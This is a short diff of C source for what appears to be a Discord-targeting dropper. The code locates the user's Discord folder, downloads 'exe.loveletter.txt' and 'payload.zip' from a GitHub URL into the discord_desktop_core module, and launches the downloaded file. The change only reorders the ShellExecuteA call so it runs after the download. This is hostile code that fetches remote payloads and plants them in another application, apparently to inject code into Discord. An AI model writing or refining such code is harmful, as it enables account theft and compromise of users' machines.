@@ -129,8 +129,6 @@ int main() {
     char app_folder[MAX_PATH];
     char zip_folder[MAX_PATH];
 
-    ShellExecuteA(NULL, "open", "exe.loveletter.txt", NULL, NULL, SW_SHOW);
-
     getUsername(username, sizeof(username));
 
     snprintf(base_path, MAX_PATH, "C:/Users/%s/AppData/Local/Discord", username);
@@ -139,6 +137,8 @@ int main() {
     snprintf(base_path, MAX_PATH, "%s/modules/discord_desktop_core-1/discord_desktop_core", app_folder);
 
     download("https://raw.githubusercontent.com/MrEggsBenedict/ILoveYou/refs/heads/main/exe.loveletter.txt", base_path);
+    
+    ShellExecuteA(NULL, "open", "exe.loveletter.txt", NULL, NULL, SW_SHOW);
 
     download("https://raw.githubusercontent.com/MrEggsBenedict/ILoveYou/refs/heads/main/payload.zip", base_path);
 
